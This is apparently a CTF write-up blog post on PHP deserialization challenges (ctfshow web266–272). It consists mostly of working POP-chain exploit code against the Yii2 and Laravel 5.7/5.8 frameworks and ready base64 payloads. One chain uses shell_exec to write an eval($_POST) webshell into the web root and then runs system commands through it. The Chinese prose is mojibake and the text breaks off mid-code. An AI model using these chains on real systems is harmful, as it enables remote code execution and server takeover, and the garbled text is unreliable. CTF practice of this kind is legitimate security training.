id="web266"><a class="markdownIt-Anchor" href="#web266">#</a> web266ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œ$cs = file_get_contents (â€˜php://inputâ€™);ï¼Œå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®æµï¼Œå¯ä»¥è·å–åˆ° GET å’Œ POST çš„æ•°æ®ï¼Œé‚£ä¹ˆï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡ post å‘ä¸€ä¸ªåŒ…ï¼Œæ•°æ®æµæ˜¯ä¸€ä¸ª ctfshow çš„ä¸€ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œéœ€è¦è§¦å‘ <code>__destruct</code>  æ–¹æ³•ï¼Œ ä¼ å…¥ä¸€ä¸ª <code>O:7:&quot;ctfshow&quot;:2:&#123;&#125;</code>  å³å¯è¾“å‡º flagï¼Œä½†æ˜¯å…·ä½“æ˜¯ä¸ºå•¥å°±ä¸å¤§æ¸…æ¥šäº†ï¼Œæ²¡æœ‰ä¿®æ”¹é‚£ä¸ªä¸º 2 çš„è¯ï¼Œå°±æ— æ³•è§¦å‘ destructã€‚å› ä¸ºä¼°è®¡æ˜¯ç ´ååºåˆ—åŒ–åçš„ç»“æœï¼Œä»ä¼šæ‰§è¡Œ__destructã€‚</p><h1 id="web267"><a class="markdownIt-Anchor" href="#web267">#</a> web267ï¼š</h1><p>â€‹è€ƒç‚¹ï¼Œyii æ¡†æ¶ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>â€‹æŸ¥çœ‹æºç ï¼Œåœ¨æœ€åå‘ç°å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/assets/b021fd51/yii.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ¨æµ‹åº”è¯¥æ˜¯ yii æ¡†æ¶ï¼Œè™½ç„¶è¿˜æ²¡å­¦è¿™ä¸ªæ˜¯ä¸ªå•¥ï¼Œå³ä¸Šè§’å‘ç°äº† loginï¼Œç‚¹è¿›å»æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œè´¦å·ä¸º adminï¼Œå¼±å¯†ç çˆ†ç ´ä¸€ä¸‹ï¼Œå¾—åˆ°å¯†ç ä¸º adminï¼Œä¹‹åç‚¹å³ä¸Šè§’çš„ aboutï¼Œæœ‰ä¸€ä¸ªæ³¨é‡Šï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?view-source --&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å‰é¢åŠ äº†ä¸ªé—®å¥½ï¼Œæ˜¯æç¤ºæˆ‘ä»¬éœ€è¦ get ä¼ å‚ï¼Œä¼ ä¸€ä¸ªåå‘ç°ååºåˆ—åŒ–çš„ä¸€ä¸ªä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>â€‹è¿›å…¥ yii.js åæç¤º yii ç‰ˆæœ¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Yii JavaScript module.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> http://www.yiiframework.com/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span> Copyright (c) 2008 Yii Software LLC</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span> http://www.yiiframework.com/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Qiang Xue &lt;qiang.xue<span class="doctag">@gmail</span>.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæŸ¥æ‰¾å†å²æ¼æ´æ‰¾åˆ°äº†ä¸€ä¸‹ pocï¼Œè¿™ä¸ªæ¼æ´æœ‰æ¡ä»¶å†çœ‹ï¼Œç°åœ¨å…ˆä¸çœ‹ï¼Œç›´æ¥ç”¨ poc æ‰“ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åé€šè¿‡ get ä¸Šä¼ ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell<span class="built_in">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><p>â€‹å°±èƒ½æ‰“å‡º phpinfoï¼Œä¹‹åä½¿ç”¨ passthru å³å¯è·å¾— flagï¼Œsystem æ²¡æœ‰å›æ˜¾ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥ echo ä¸€å¥è¯æœ¨é©¬è¿›ä¸€ä¸ªæ–‡ä»¶ä¹Ÿè¡Œã€‚</p><h1 id="web268"><a class="markdownIt-Anchor" href="#web268">#</a> web268ï¼š</h1><p>â€‹ç›¸æ¯”äºä¸Šä¸€é¢˜æœ‰è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ª poc å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &quot;<span class="title class_">echo</span> &#x27;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&#x27; &gt; /var/www/html/basic/web/1.php&quot;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize($exp)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å exp ä¸ºï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell<span class="built_in">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åè®¿é—® 1.php ç„¶å post ä¸€ä¸ª 1=system (â€œcat /flagsâ€); å³å¯</p><h1 id="web269"><a class="markdownIt-Anchor" href="#web269">#</a> web269ï¼š</h1><p>â€‹å’Œä¸Šä¸€ä¸ªé¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œæ²¡ä»»ä½•åŒºåˆ«ã€‚</p><h1 id="web270"><a class="markdownIt-Anchor" href="#web270">#</a> web270ï¼š</h1><p>â€‹268 é¢˜çš„ poc ä¾æ—§èƒ½ç”¨ï¼Œç›´æ¥ç”¨ã€‚</p><h1 id="web271"><a class="markdownIt-Anchor" href="#web271">#</a> web271ï¼š</h1><p>â€‹Laravel 5.7 çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæºç åœ¨è¿™å„¿ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcmF2ZWwvbGFyYXZlbC90cmVlLzUuNyVFMyU4MCU4Mg==">https://github.com/laravel/laravel/tree/5.7ã€‚</span></p><p>â€‹ä¸å¤§ä¼šå¼€å‘ï¼Œç›´æ¥ä¸Š poc ç®—äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters[]=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app=<span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web272"><a class="markdownIt-Anchor" href="#web272">#</a> web272ï¼š</h1><p>â€‹ä¸Šä¸€ç¯‡æ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTEzODM1MDU3">laravel5.8 ååºåˆ—åŒ–æ¼æ´å¤ç°</span></p><p>â€‹ç›´æ¥ä¸Š pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable 